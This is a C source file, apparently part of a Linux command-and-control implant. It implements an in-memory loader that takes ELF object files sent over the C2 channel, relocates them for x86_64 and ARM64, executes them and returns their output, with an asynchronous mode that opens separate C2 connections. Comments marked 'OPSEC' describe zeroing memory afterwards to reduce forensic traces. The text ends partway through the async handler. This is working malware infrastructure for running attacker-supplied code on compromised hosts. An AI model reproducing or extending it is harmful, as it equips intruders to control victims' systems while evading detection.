/// elf_bof.c — ELF BOF Loader for Linux Agent
/// In-memory loader for ELF relocatable objects (.o files compiled with gcc -c)
/// Supports x86_64 and ARM64 relocations
/// OPSEC: mmap(RW) → mprotect per-section → execute → zero → munmap

#include "elf_bof.h"
#include "crt.h"
#include "types.h"
#include "msgpack.h"
#include "jobs.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// mprotect constants
#define PROT_NONE    0x0
#define PROT_READ    0x1
#define PROT_WRITE   0x2
#define PROT_EXEC    0x4
#define MAP_PRIVATE  0x02
#define MAP_ANONYMOUS 0x20
#define MAP_FAILED   ((void *)-1)

/// External BOF API functions (from bof_api.c)
extern void  bof_output_init(void);
extern void  bof_output_cleanup(void);
extern const char *bof_output_get(int *out_len);
extern int   bof_output_get_error(void);
extern void *bof_resolve_symbol(const char *name);
extern void  bof_set_async_ctx(void *ctx, int stop_fd);
extern void  bof_clear_async_ctx(void);

/// ────────────────────────────────────────────────────────────────────────────
/// Internal structures
/// ────────────────────────────────────────────────────────────────────────────

/// Loaded section descriptor
typedef struct {
    void       *base;        // pointer within the contiguous arena
    size_t      size;        // allocated size (page-aligned)
    size_t      raw_size;    // original section size
    uint32_t    flags;       // ELF section flags (SHF_*)
    int         shndx;       // original section index in ELF
} loaded_section_t;

/// Contiguous memory arena for all BOF sections + trampolines.
/// All sections are allocated within a single mmap to guarantee PC-relative
/// relocations (R_X86_64_PC32, R_X86_64_PLT32) stay within ±2 GB range.
typedef struct {
    void       *base;        // single mmap base
    size_t      total_size;  // total mmap'd size
    void       *trampoline;  // pointer to trampoline area within arena
    int         tramp_count; // number of trampolines written
} bof_arena_t;

/// Resolved symbol value
typedef struct {
    uint64_t    value;       // resolved address
    int         section;     // section index (-1 if external)
    int         resolved;    // 1 if resolved
} sym_value_t;

/// BOF entry function type
typedef void (*bof_entry_t)(char *args, int args_len);

/// ────────────────────────────────────────────────────────────────────────────
/// Page alignment
/// ────────────────────────────────────────────────────────────────────────────

static inline size_t page_align(size_t size) {
    return (size + 4095) & ~(size_t)4095;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Validate ELF header
/// ────────────────────────────────────────────────────────────────────────────

static int validate_elf(const Elf64_Ehdr *ehdr, uint32_t file_size) {
    // Check magic
    if (ehdr->e_ident[0] != ELFMAG0 || ehdr->e_ident[1] != ELFMAG1 ||
        ehdr->e_ident[2] != ELFMAG2 || ehdr->e_ident[3] != ELFMAG3)
        return -1;

    // Check 64-bit little-endian
    if (ehdr->e_ident[4] != ELFCLASS64 || ehdr->e_ident[5] != ELFDATA2LSB)
        return -1;

    // Must be relocatable object (ET_REL)
    if (ehdr->e_type != ET_REL)
        return -1;

    // Check machine type matches our build
#ifdef ARCH_X86_64
    if (ehdr->e_machine != EM_X86_64)
        return -1;
#endif
#ifdef ARCH_AARCH64
    if (ehdr->e_machine != EM_AARCH64)
        return -1;
#endif

    // Bounds check section header table
    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0)
        return -1;
    if (ehdr->e_shoff + (uint64_t)ehdr->e_shnum * ehdr->e_shentsize > file_size)
        return -1;

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Allocate sections — single contiguous mmap for all SHF_ALLOC sections
/// This guarantees all inter-section PC-relative relocations (R_X86_64_PC32,
/// R_X86_64_PLT32, ARM64 CALL26/JUMP26) fit within ±2 GB / ±128 MB range.
/// A trampoline area is appended for external function calls.
/// ────────────────────────────────────────────────────────────────────────────

/// Max trampolines (one per unique external symbol reference)
#define BOF_MAX_TRAMPOLINES 128

/// Trampoline stub sizes
#ifdef ARCH_X86_64
#define TRAMPOLINE_SIZE 14   // FF 25 00 00 00 00 [8-byte addr] = jmp [rip+0]
#endif
#ifdef ARCH_AARCH64
#define TRAMPOLINE_SIZE 16   // ldr x16, [pc+8]; br x16; .quad addr
#endif

static int allocate_sections(const uint8_t *elf_data, const Elf64_Ehdr *ehdr,
                             const Elf64_Shdr *shdrs,
                             loaded_section_t *sections, int *num_sections,
                             bof_arena_t *arena) {
    *num_sections = 0;
    arena->base = (void *)0;
    arena->total_size = 0;
    arena->trampoline = (void *)0;
    arena->tramp_count = 0;

    // ── Pass 1: compute total size needed ──
    // Each section is page-aligned so mprotect per-section doesn't conflict
    size_t total = 0;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        const Elf64_Shdr *shdr = &shdrs[i];
        if (!(shdr->sh_flags & SHF_ALLOC))
            continue;
        total = page_align(total);  // page-align each section start
        total += shdr->sh_size > 0 ? shdr->sh_size : 16;
    }
    // Trampoline area (page-aligned start, enough for max trampolines)
    total = page_align(total);
    size_t tramp_offset = total;
    total += page_align(BOF_MAX_TRAMPOLINES * TRAMPOLINE_SIZE);

    // ── Pass 2: single mmap ──
    size_t mmap_size = page_align(total);
    void *base = sys_mmap((void *)0, mmap_size,
                          PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;

    ax_memset(base, 0, mmap_size);
    arena->base = base;
    arena->total_size = mmap_size;
    arena->trampoline = (uint8_t *)base + tramp_offset;
    arena->tramp_count = 0;

    // ── Pass 3: lay out sections within the arena (page-aligned) ──
    size_t offset = 0;
    for (int i = 0; i < ehdr->e_shnum && *num_sections < BOF_MAX_SECTIONS; i++) {
        const Elf64_Shdr *shdr = &shdrs[i];
        if (!(shdr->sh_flags & SHF_ALLOC))
            continue;

        offset = page_align(offset);  // page-align each section

        size_t sec_size = shdr->sh_size > 0 ? shdr->sh_size : 16;
        void *sec_base = (uint8_t *)base + offset;

        // Copy section data (SHT_NOBITS sections like .bss are zero-filled already)
        if (shdr->sh_type != SHT_NOBITS && shdr->sh_size > 0) {
            ax_memcpy(sec_base, elf_data + shdr->sh_offset, shdr->sh_size);
        }

        loaded_section_t *ls = &sections[*num_sections];
        ls->base     = sec_base;
        ls->size     = sec_size;
        ls->raw_size = shdr->sh_size;
        ls->flags    = (uint32_t)shdr->sh_flags;
        ls->shndx    = i;
        (*num_sections)++;

        offset += sec_size;
    }

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Write a trampoline stub for an external function, returns stub address
/// ────────────────────────────────────────────────────────────────────────────

static void *write_trampoline(bof_arena_t *arena, uint64_t target_addr) {
    if (arena->tramp_count >= BOF_MAX_TRAMPOLINES)
        return (void *)0;

    uint8_t *stub = (uint8_t *)arena->trampoline + (arena->tramp_count * TRAMPOLINE_SIZE);
    arena->tramp_count++;

#ifdef ARCH_X86_64
    // jmp [rip+0] ; .quad target_addr
    // FF 25 00 00 00 00  xx xx xx xx xx xx xx xx
    stub[0] = 0xFF;
    stub[1] = 0x25;
    stub[2] = 0x00;
    stub[3] = 0x00;
    stub[4] = 0x00;
    stub[5] = 0x00;
    ax_memcpy(stub + 6, &target_addr, 8);
#endif

#ifdef ARCH_AARCH64
    // ldr x16, #8    →  58000050
    // br  x16        →  D61F0200
    // .quad target_addr
    uint32_t ldr_insn = 0x58000050;  // ldr x16, pc+8
    uint32_t br_insn  = 0xD61F0200;  // br x16
    ax_memcpy(stub + 0, &ldr_insn, 4);
    ax_memcpy(stub + 4, &br_insn, 4);
    ax_memcpy(stub + 8, &target_addr, 8);
#endif

    return (void *)stub;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Find loaded section by ELF section index
/// ────────────────────────────────────────────────────────────────────────────

static loaded_section_t *find_loaded_section(loaded_section_t *sections, int num_sections, int shndx) {
    for (int i = 0; i < num_sections; i++) {
        if (sections[i].shndx == shndx)
            return &sections[i];
    }
    return (loaded_section_t *)0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Resolve all symbols
/// ────────────────────────────────────────────────────────────────────────────

static int resolve_symbols(const Elf64_Sym *symtab, int num_syms,
                           const char *strtab,
                           loaded_section_t *sections, int num_sections,
                           sym_value_t *sym_values, bof_arena_t *arena,
                           char *err_symbol, int err_symbol_size) {
    for (int i = 0; i < num_syms; i++) {
        const Elf64_Sym *sym = &symtab[i];
        sym_values[i].resolved = 0;
        sym_values[i].value    = 0;
        sym_values[i].section  = -1;

        // STT_SECTION symbols — point to the loaded section base
        if (ELF64_ST_TYPE(sym->st_info) == 3 /* STT_SECTION */) {
            loaded_section_t *ls = find_loaded_section(sections, num_sections, sym->st_shndx);
            if (ls) {
                sym_values[i].value    = (uint64_t)(uintptr_t)ls->base;
                sym_values[i].section  = sym->st_shndx;
                sym_values[i].resolved = 1;
            }
            continue;
        }

        // Defined symbols (st_shndx != SHN_UNDEF)
        if (sym->st_shndx != SHN_UNDEF) {
            loaded_section_t *ls = find_loaded_section(sections, num_sections, sym->st_shndx);
            if (ls) {
                sym_values[i].value    = (uint64_t)(uintptr_t)ls->base + sym->st_value;
                sym_values[i].section  = sym->st_shndx;
                sym_values[i].resolved = 1;
            }
            continue;
        }

        // Undefined symbol — must be a BOF API function
        const char *name = strtab + sym->st_name;
        if (sym->st_name == 0 || name[0] == '\0') {
            // Empty name for symbol 0 — skip
            sym_values[i].resolved = 1;
            continue;
        }

        void *func = bof_resolve_symbol(name);
        if (func) {
            // External function: create a trampoline stub within the arena
            // so that PC-relative relocations (R_X86_64_PLT32, ARM64 CALL26)
            // can reach it within ±2 GB / ±128 MB range
            void *tramp = write_trampoline(arena, (uint64_t)(uintptr_t)func);
            if (tramp) {
                sym_values[i].value = (uint64_t)(uintptr_t)tramp;
            } else {
                // Fallback: use direct address (may overflow for PLT32/CALL26
                // but works for R_X86_64_64/R_AARCH64_ABS64)
                sym_values[i].value = (uint64_t)(uintptr_t)func;
            }
            sym_values[i].section  = -1;  // external
            sym_values[i].resolved = 1;
        } else {
            // Weak symbols are allowed to be unresolved (value = 0)
            if (ELF64_ST_BIND(sym->st_info) == STB_WEAK) {
                sym_values[i].value    = 0;
                sym_values[i].resolved = 1;
            } else {
                // Fatal: unresolved symbol
                ax_strncpy(err_symbol, name, err_symbol_size - 1);
                err_symbol[err_symbol_size - 1] = '\0';
                return -1;
            }
        }
    }

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Apply relocations — x86_64
/// ────────────────────────────────────────────────────────────────────────────

#ifdef ARCH_X86_64
static int apply_relocations_x64(const Elf64_Rela *relas, int num_relas,
                                  sym_value_t *sym_values,
                                  loaded_section_t *target_section) {
    for (int i = 0; i < num_relas; i++) {
        const Elf64_Rela *rela = &relas[i];
        uint32_t sym_idx = (uint32_t)ELF64_R_SYM(rela->r_info);
        uint32_t type    = (uint32_t)ELF64_R_TYPE(rela->r_info);

        if (!sym_values[sym_idx].resolved)
            return -1;

        uint64_t S = sym_values[sym_idx].value;
        int64_t  A = rela->r_addend;
        uint8_t *P = (uint8_t *)target_section->base + rela->r_offset;

        switch (type) {
        case R_X86_64_64:
            *(uint64_t *)P = S + A;
            break;

        case R_X86_64_PC32:
        case R_X86_64_PLT32: {
            int64_t val = (int64_t)S + A - (int64_t)(uintptr_t)P;
            *(int32_t *)P = (int32_t)val;
            break;
        }

        case R_X86_64_32:
            *(uint32_t *)P = (uint32_t)(S + A);
            break;

        case R_X86_64_32S:
            *(int32_t *)P = (int32_t)(S + A);
            break;

        default:
            // Unsupported relocation type — skip (non-fatal)
            break;
        }
    }
    return 0;
}
#endif

/// ────────────────────────────────────────────────────────────────────────────
/// Apply relocations — ARM64 (AArch64)
/// ────────────────────────────────────────────────────────────────────────────

#ifdef ARCH_AARCH64
static int apply_relocations_arm64(const Elf64_Rela *relas, int num_relas,
                                    sym_value_t *sym_values,
                                    loaded_section_t *target_section) {
    for (int i = 0; i < num_relas; i++) {
        const Elf64_Rela *rela = &relas[i];
        uint32_t sym_idx = (uint32_t)ELF64_R_SYM(rela->r_info);
        uint32_t type    = (uint32_t)ELF64_R_TYPE(rela->r_info);

        if (!sym_values[sym_idx].resolved)
            return -1;

        uint64_t S = sym_values[sym_idx].value;
        int64_t  A = rela->r_addend;
        uint8_t *P = (uint8_t *)target_section->base + rela->r_offset;

        switch (type) {
        case R_AARCH64_ABS64:
            *(uint64_t *)P = S + A;
            break;

        case R_AARCH64_CALL26:
        case R_AARCH64_JUMP26: {
            int64_t offset = ((int64_t)S + A - (int64_t)(uintptr_t)P) >> 2;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFC000000) | (offset & 0x3FFFFFF);
            break;
        }

        case R_AARCH64_ADR_PREL_PG_HI21: {
            int64_t page_s = ((int64_t)S + A) & ~0xFFFLL;
            int64_t page_p = (int64_t)(uintptr_t)P & ~0xFFFLL;
            int64_t offset = page_s - page_p;
            uint32_t immlo = ((offset >> 12) & 0x3) << 29;
            uint32_t immhi = ((offset >> 14) & 0x7FFFF) << 5;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0x9F00001F) | immlo | immhi;
            break;
        }

        case R_AARCH64_ADD_ABS_LO12_NC:
        case R_AARCH64_LDST8_ABS_LO12_NC: {
            uint64_t val = (S + A) & 0xFFF;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFFC003FF) | ((val & 0xFFF) << 10);
            break;
        }

        case R_AARCH64_LDST16_ABS_LO12_NC: {
            uint64_t val = ((S + A) & 0xFFF) >> 1;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFFC003FF) | ((val & 0xFFF) << 10);
            break;
        }

        case R_AARCH64_LDST32_ABS_LO12_NC: {
            uint64_t val = ((S + A) & 0xFFF) >> 2;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFFC003FF) | ((val & 0xFFF) << 10);
            break;
        }

        case R_AARCH64_LDST64_ABS_LO12_NC: {
            uint64_t val = ((S + A) & 0xFFF) >> 3;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFFC003FF) | ((val & 0xFFF) << 10);
            break;
        }

        case R_AARCH64_LDST128_ABS_LO12_NC: {
            uint64_t val = ((S + A) & 0xFFF) >> 4;
            uint32_t *insn = (uint32_t *)P;
            *insn = (*insn & 0xFFC003FF) | ((val & 0xFFF) << 10);
            break;
        }

        default:
            // Unsupported relocation type — skip
            break;
        }
    }
    return 0;
}
#endif

/// ────────────────────────────────────────────────────────────────────────────
/// Apply protections — per-section mprotect
/// ────────────────────────────────────────────────────────────────────────────

static int protect_sections(loaded_section_t *sections, int num_sections,
                            bof_arena_t *arena) {
    // Protect per-section: mprotect requires page-aligned addresses and sizes.
    // Since sections within the arena may share pages, we use page-aligned ranges.
    for (int i = 0; i < num_sections; i++) {
        int prot;
        if (sections[i].flags & SHF_EXECINSTR) {
            prot = PROT_READ | PROT_EXEC;
        } else if (sections[i].flags & SHF_WRITE) {
            prot = PROT_READ | PROT_WRITE;
        } else {
            prot = PROT_READ;
        }
        // Page-align the section start and size for mprotect
        uintptr_t sec_start = (uintptr_t)sections[i].base;
        uintptr_t page_start = sec_start & ~(uintptr_t)4095;
        size_t prot_size = page_align((sec_start - page_start) + sections[i].size);
        if (sys_mprotect((void *)page_start, prot_size, prot) != 0)
            return -1;
    }

    // Protect trampoline area as RX (it contains executable stubs)
    if (arena->tramp_count > 0 && arena->trampoline) {
        uintptr_t tramp_start = (uintptr_t)arena->trampoline;
        uintptr_t page_start = tramp_start & ~(uintptr_t)4095;
        size_t tramp_used = (size_t)arena->tramp_count * TRAMPOLINE_SIZE;
        size_t prot_size = page_align((tramp_start - page_start) + tramp_used);
        if (sys_mprotect((void *)page_start, prot_size, PROT_READ | PROT_EXEC) != 0)
            return -1;
    }

#ifdef ARCH_AARCH64
    // Flush instruction cache (mandatory on ARM64 after mprotect → RX)
    for (int i = 0; i < num_sections; i++) {
        if (sections[i].flags & SHF_EXECINSTR) {
            uint8_t *start = (uint8_t *)sections[i].base;
            uint8_t *end   = start + sections[i].raw_size;
            for (uint8_t *p = start; p < end; p += 64) {
                __asm__ volatile("dc cvau, %0" :: "r"(p) : "memory");
            }
            __asm__ volatile("dsb ish" ::: "memory");
            for (uint8_t *p = start; p < end; p += 64) {
                __asm__ volatile("ic ivau, %0" :: "r"(p) : "memory");
            }
            __asm__ volatile("dsb ish\n\tisb" ::: "memory");
        }
    }
    // Also flush trampoline area icache
    if (arena->tramp_count > 0 && arena->trampoline) {
        uint8_t *start = (uint8_t *)arena->trampoline;
        uint8_t *end   = start + (arena->tramp_count * TRAMPOLINE_SIZE);
        for (uint8_t *p = start; p < end; p += 64) {
            __asm__ volatile("dc cvau, %0" :: "r"(p) : "memory");
        }
        __asm__ volatile("dsb ish" ::: "memory");
        for (uint8_t *p = start; p < end; p += 64) {
            __asm__ volatile("ic ivau, %0" :: "r"(p) : "memory");
        }
        __asm__ volatile("dsb ish\n\tisb" ::: "memory");
    }
#endif

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Cleanup — revert arena to RW, zero, single munmap
/// ────────────────────────────────────────────────────────────────────────────

static void cleanup_arena(bof_arena_t *arena) {
    if (arena->base && arena->total_size > 0) {
        // Revert entire arena to RW for zeroing
        sys_mprotect(arena->base, arena->total_size, PROT_READ | PROT_WRITE);
        // OPSEC: Zero all memory
        volatile uint8_t *p = (volatile uint8_t *)arena->base;
        for (size_t j = 0; j < arena->total_size; j++)
            p[j] = 0;
        // Release memory
        sys_munmap(arena->base, arena->total_size);
        arena->base = (void *)0;
        arena->total_size = 0;
    }
}

/// ────────────────────────────────────────────────────────────────────────────
/// Find entry point symbol ("go" function)
/// ────────────────────────────────────────────────────────────────────────────

static bof_entry_t find_entry(const char *entry_name,
                              const Elf64_Sym *symtab, int num_syms,
                              const char *strtab,
                              sym_value_t *sym_values) {
    for (int i = 0; i < num_syms; i++) {
        if (symtab[i].st_shndx == SHN_UNDEF)
            continue;
        const char *name = strtab + symtab[i].st_name;
        if (ax_strcmp(name, entry_name) == 0 && sym_values[i].resolved) {
            return (bof_entry_t)(uintptr_t)sym_values[i].value;
        }
    }
    return (bof_entry_t)0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Write BOF error response to msgpack
/// ────────────────────────────────────────────────────────────────────────────

static void bof_error_response(mp_writer_t *response, int error_code, const char *message) {
    mp_write_map(response, 2);
    mp_write_kv_int(response, "type", error_code);
    mp_write_kv_str(response, "output", message ? message : "");
}

/// ────────────────────────────────────────────────────────────────────────────
/// Write BOF success response to msgpack
/// ────────────────────────────────────────────────────────────────────────────

static void bof_success_response(mp_writer_t *response, const char *output) {
    mp_write_map(response, 2);
    mp_write_kv_int(response, "type", 0x20);  // CALLBACK_OUTPUT_UTF8
    mp_write_kv_str(response, "output", output ? output : "");
}

/// ────────────────────────────────────────────────────────────────────────────
/// Core ELF BOF execute
/// ────────────────────────────────────────────────────────────────────────────

static int elf_bof_execute(const uint8_t *elf_data, uint32_t elf_size,
                           const uint8_t *args, uint32_t args_size,
                           const char *entry_name,
                           mp_writer_t *response) {
    loaded_section_t sections[BOF_MAX_SECTIONS];
    int num_sections = 0;
    bof_arena_t arena;
    arena.base = (void *)0;
    arena.total_size = 0;

    // ── Step 1: Validate ELF header ──
    if (elf_size < sizeof(Elf64_Ehdr)) {
        bof_error_response(response, BOF_ERR_PARSE, "ELF file too small");
        return -1;
    }

    const Elf64_Ehdr *ehdr = (const Elf64_Ehdr *)elf_data;
    if (validate_elf(ehdr, elf_size) != 0) {
        bof_error_response(response, BOF_ERR_PARSE, "Invalid ELF header");
        return -1;
    }

    // ── Step 2: Parse section headers ──
    const Elf64_Shdr *shdrs = (const Elf64_Shdr *)(elf_data + ehdr->e_shoff);

    // Find .symtab, .strtab, and section name string table
    const Elf64_Sym *symtab = (const Elf64_Sym *)0;
    const char      *strtab = (const char *)0;
    int num_syms = 0;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_SYMTAB) {
            symtab = (const Elf64_Sym *)(elf_data + shdrs[i].sh_offset);
            num_syms = (int)(shdrs[i].sh_size / shdrs[i].sh_entsize);
            // strtab is linked via sh_link
            int strtab_idx = (int)shdrs[i].sh_link;
            if (strtab_idx < ehdr->e_shnum) {
                strtab = (const char *)(elf_data + shdrs[strtab_idx].sh_offset);
            }
            break;
        }
    }

    if (!symtab || !strtab || num_syms == 0) {
        bof_error_response(response, BOF_ERR_PARSE, "No symbol table found");
        return -1;
    }

    // ── Step 3: Allocate all sections in a single contiguous mmap ──
    if (allocate_sections(elf_data, ehdr, shdrs, sections, &num_sections, &arena) != 0) {
        cleanup_arena(&arena);
        bof_error_response(response, BOF_ERR_ALLOC, "Failed to allocate sections");
        return -1;
    }

    // ── Step 4: Resolve symbols (creates trampolines for external functions) ──
    sym_value_t *sym_values = (sym_value_t *)ax_malloc(num_syms * sizeof(sym_value_t));
    if (!sym_values) {
        cleanup_arena(&arena);
        bof_error_response(response, BOF_ERR_ALLOC, "Failed to allocate symbol table");
        return -1;
    }
    ax_memset(sym_values, 0, num_syms * sizeof(sym_value_t));

    char err_symbol[128];
    err_symbol[0] = '\0';
    if (resolve_symbols(symtab, num_syms, strtab, sections, num_sections,
                        sym_values, &arena, err_symbol, sizeof(err_symbol)) != 0) {
        ax_free(sym_values);
        cleanup_arena(&arena);
        bof_error_response(response, BOF_ERR_SYMBOL, err_symbol);
        return -1;
    }

    // ── Step 5: Apply relocations ──
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type != SHT_RELA)
            continue;

        // sh_info points to the section being relocated
        int target_shndx = (int)shdrs[i].sh_info;
        loaded_section_t *target = find_loaded_section(sections, num_sections, target_shndx);
        if (!target)
            continue;  // relocs for non-loaded section — skip

        const Elf64_Rela *relas = (const Elf64_Rela *)(elf_data + shdrs[i].sh_offset);
        int num_relas = (int)(shdrs[i].sh_size / sizeof(Elf64_Rela));

        int ret;
#ifdef ARCH_X86_64
        ret = apply_relocations_x64(relas, num_relas, sym_values, target);
#endif
#ifdef ARCH_AARCH64
        ret = apply_relocations_arm64(relas, num_relas, sym_values, target);
#endif
        if (ret != 0) {
            ax_free(sym_values);
            cleanup_arena(&arena);
            bof_error_response(response, BOF_ERR_RELOC, "Relocation failed");
            return -1;
        }
    }

    // ── Step 6: Protect sections (per-section mprotect + trampoline area) ──
    if (protect_sections(sections, num_sections, &arena) != 0) {
        ax_free(sym_values);
        cleanup_arena(&arena);
        bof_error_response(response, BOF_ERR_ALLOC, "mprotect failed");
        return -1;
    }

    // ── Step 7: Find entry point ──
    bof_entry_t entry = find_entry(entry_name, symtab, num_syms, strtab, sym_values);
    if (!entry) {
        ax_free(sym_values);
        cleanup_arena(&arena);
        bof_error_response(response, BOF_ERR_ENTRY, "Entry function not found");
        return -1;
    }

    // ── Step 8: Initialize BOF output, execute, collect output ──
    bof_output_init();

    entry((char *)args, (int)args_size);

    // Collect output
    int output_len = 0;
    const char *output = bof_output_get(&output_len);
    int error_type = bof_output_get_error();

    // Write response
    if (error_type != 0) {
        bof_error_response(response, error_type, output);
    } else if (output_len > 0) {
        bof_success_response(response, output);
    } else {
        // No output — empty success
        bof_success_response(response, "(no output)");
    }

    bof_output_cleanup();

    // ── Step 9: Cleanup — zero and release arena ──
    ax_free(sym_values);
    cleanup_arena(&arena);

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Public API: task_exec_bof — called from commander.c
/// Parses msgpack command data, dispatches to elf_bof_execute
/// ────────────────────────────────────────────────────────────────────────────

int task_exec_bof(uint32_t cmd_id, const uint8_t *data, uint32_t data_len, mp_writer_t *response) {
    // Parse msgpack: {content: bytes, args: bytes, entry_func: string}
    mp_reader_t reader;
    mp_reader_init(&reader, data, data_len);

    uint32_t map_count = 0;
    if (mp_read_map(&reader, &map_count) != 0 || map_count < 1) {
        bof_error_response(response, BOF_ERR_PARSE, "Invalid BOF command data");
        return 0;
    }

    const uint8_t *bof_content = (const uint8_t *)0;
    uint32_t bof_size = 0;
    const uint8_t *args = (const uint8_t *)0;
    uint32_t args_size = 0;
    const char *entry_func = "go";
    uint32_t entry_func_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key;
        uint32_t key_len;
        if (mp_read_str(&reader, &key, &key_len) != 0) {
            mp_skip(&reader);
            mp_skip(&reader);
            continue;
        }

        if (key_len == 7 && ax_strncmp(key, "content", 7) == 0) {
            mp_read_bin(&reader, &bof_content, &bof_size);
        } else if (key_len == 4 && ax_strncmp(key, "args", 4) == 0) {
            mp_read_bin(&reader, &args, &args_size);
        } else if (key_len == 10 && ax_strncmp(key, "entry_func", 10) == 0) {
            mp_read_str(&reader, &entry_func, &entry_func_len);
        } else {
            mp_skip(&reader);
        }
    }

    if (!bof_content || bof_size == 0) {
        bof_error_response(response, BOF_ERR_PARSE, "No BOF content");
        return 0;
    }

    // Make entry_func a proper null-terminated string if needed
    char entry_name[64];
    if (entry_func_len > 0 && entry_func_len < sizeof(entry_name)) {
        ax_memcpy(entry_name, entry_func, entry_func_len);
        entry_name[entry_func_len] = '\0';
    } else {
        ax_strcpy(entry_name, "go");
    }

    elf_bof_execute(bof_content, bof_size, args, args_size, entry_name, response);

    return 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Async BOF — background thread with separate C2 connection
/// ────────────────────────────────────────────────────────────────────────────

typedef struct {
    uint8_t  *bof_data;        // deep copy of ELF .o
    uint32_t  bof_size;
    uint8_t  *args_data;       // deep copy of args
    uint32_t  args_size;
    char      entry_name[64];  // "go" or custom
    char      job_id[64];      // task ID for job tracking
    int       job_idx;         // index in g_job_ctx.jobs[]
    int       stop_pipe[2];    // pipe for cooperative stop (write=signal, read=poll)
} async_bof_arg_t;

/// Send BOF output over the job's C2 connection
static void async_bof_send_output(connector_t *conn, const char *job_id,
                                   int output_type, const char *output, int output_len) {
    // Build inner data: {type: int, output: string}
    mp_writer_t data_w;
    mp_writer_init(&data_w, 64 + output_len);
    mp_write_map(&data_w, 2);
    mp_write_kv_int(&data_w, "type", output_type);
    if (output && output_len > 0) {
        mp_write_str(&data_w, "output", 6);
        mp_write_str(&data_w, output, output_len);
    } else {
        mp_write_kv_str(&data_w, "output", "");
    }

    jobs_send_message(&g_job_ctx, conn, COMMAND_EXEC_BOF_OUT, job_id,
                      data_w.buf.data, (uint32_t)data_w.buf.len);
    mp_writer_free(&data_w);
}

/// Worker thread for async BOF execution
static void *async_bof_thread(void *param) {
    async_bof_arg_t *arg = (async_bof_arg_t *)param;
    job_entry_t *job = &g_job_ctx.jobs[arg->job_idx];

    // Open separate C2 connection for this BOF
    if (jobs_open_connection(&g_job_ctx, &job->conn) != 0) {
        // Connection failed — report error and cleanup
        job->active = 0;
        goto CLEANUP;
    }

    // Send init pack for BOF type
    {
        mp_writer_t init_w;
        mp_writer_init(&init_w, 64);
        mp_write_map(&init_w, 1);
        mp_write_kv_str(&init_w, "job_id", arg->job_id);
        jobs_send_init(&g_job_ctx, &job->conn, BOF_PACK, init_w.buf.data, (uint32_t)init_w.buf.len);
        mp_writer_free(&init_w);
    }

    // Execute the ELF BOF synchronously within this thread
    {
        // Set async context so BeaconGetStopJobEvent() returns the stop pipe fd
        bof_set_async_ctx(arg, arg->stop_pipe[0]);

        mp_writer_t bof_response;
        mp_writer_init(&bof_response, 4096);
        elf_bof_execute(arg->bof_data, arg->bof_size,
                        arg->args_data, arg->args_size,
                        arg->entry_name, &bof_response);

        // Parse the response to extract type and output, then send via C2
        if (bof_response.buf.len > 0) {
            mp_reader_t rdr;
            mp_reader_init(&rdr, bof_response.buf.data, bof_response.buf.len);
            uint32_t map_cnt = 0;
            if (mp_read_map(&rdr, &map_cnt) == 0) {
                int out_type = 0x20; // default CALLBACK_OUTPUT_UTF8
                const char *out_str = "";
                uint32_t out_len = 0;

                for (uint32_t i = 0; i < map_cnt; i++) {
                    const char *key;
                    uint32_t key_len;
                    if (mp_read_str(&rdr, &key, &key_len) != 0) {
                        mp_skip(&rdr);
                        mp_skip(&rdr);
                        continue;
                    }
                    if (key_len == 4 && ax_strncmp(key, "type", 4) == 0) {
                        int64_t v;
                        mp_read_int(&rdr, &v);
                        out_type = (int)v;
                    } else if (key_len == 6 && ax_strncmp(key, "output", 6) == 0) {
                        mp_read_str(&rdr, &out_str, &out_len);
                    } else {
                        mp_skip(&rdr);
                    }
                }

                async_bof_send_output(&job->conn, arg->job_id, out_type, out_str, (int)out_len);
            }
        }
        mp_writer_free(&bof_response);
        bof_clear_async_ctx();
    }

    // Send sentinel (type 0xFF) to signal BOF completion
    async_bof_send_output(&job->conn, arg->job_id, 0xFF, "", 0);

    // Close C2 connection
    conn_close(&job->conn);
    job->active = 0;

CLEANUP:
    // OPSEC: zero and free deep-copied data
    if (arg->bof_data) {
        volatile uint8_t *p = (volatile uint8_t *)arg->bof_data;
        for (uint32_t i = 0; i < arg->bof_size; i++) p[i] = 0;
        ax_free(arg->bof_data);
    }
    if (arg->args_data) {
        volatile uint8_t *p = (volatile uint8_t *)arg->args_data;
        for (uint32_t i = 0; i < arg->args_size; i++) p[i] = 0;
        ax_free(arg->args_data);
    }
    if (arg->stop_pipe[0] >= 0) sys_close(arg->stop_pipe[0]);
    if (arg->stop_pipe[1] >= 0) sys_close(arg->stop_pipe[1]);
    ax_free(arg);

    return (void *)0;
}

int task_exec_bof_async(uint32_t cmd_id, const uint8_t *data, uint32_t data_len, mp_writer_t *response) {
    // Parse msgpack: {content: bytes, args: bytes, entry_func: string}
    mp_reader_t reader;
    mp_reader_init(&reader, data, data_len);

    uint32_t map_count = 0;
    if (mp_read_map(&reader, &map_count) != 0 || map_count < 1) {
        bof_error_response(response, BOF_ERR_PARSE, "Invalid BOF command data");
        return 0;
    }

    const uint8_t *bof_content = (const uint8_t *)0;
    uint32_t bof_size = 0;
    const uint8_t *args = (const uint8_t *)0;
    uint32_t args_size = 0;
    const char *entry_func = "go";
    uint32_t entry_func_len = 0;

